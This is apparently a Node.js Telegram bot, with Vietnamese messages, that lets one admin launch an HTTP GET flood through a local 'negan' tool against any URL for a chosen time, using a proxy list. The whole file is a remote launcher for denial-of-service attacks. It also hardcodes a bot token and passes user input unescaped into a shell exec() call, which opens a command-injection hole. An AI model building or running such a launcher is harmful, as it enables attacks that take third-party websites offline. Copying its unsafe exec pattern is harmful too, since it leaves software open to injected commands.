const TelegramBot = require('node-telegram-bot-api');
const { exec } = require('child_process');

const token = '8129263243:AAFFuKtWwFC_pX_hhbcHGknet9hZg26fu3w';
const bot = new TelegramBot(token, { polling: true });

const adminId = 7371969470;

bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;

    if (chatId !== adminId) {
        bot.sendMessage(chatId, 'Bạn không có quyền thực hiện lệnh này.');
        return;
    }

    const parts = text.split(' ');
    if (parts.length !== 2 || !parts[0].startsWith('http')) {
        bot.sendMessage(chatId, 'Sai định dạng! Nhập theo: <URL> <time>.');
        return;
    }

    const [host, time] = parts;

    if (!host.startsWith('http://') && !host.startsWith('https://')) {
        bot.sendMessage(chatId, 'URL không hợp lệ! Cần có http:// hoặc https://.');
        return;
    }

    const command = `node ./negan -m GET -u ${host} -p 1.txt --full true -s ${time}`;

    const childProcess = exec(command, (error, stdout, stderr) => {
        if (error || stderr) {
            bot.sendMessage(chatId, `Error: Lệnh không thực thi được!`);
        } else {
            const pid = childProcess.pid;
            bot.sendMessage(chatId, `Successfully: ${command}\nPID: ${pid}`);
        }
    });
});
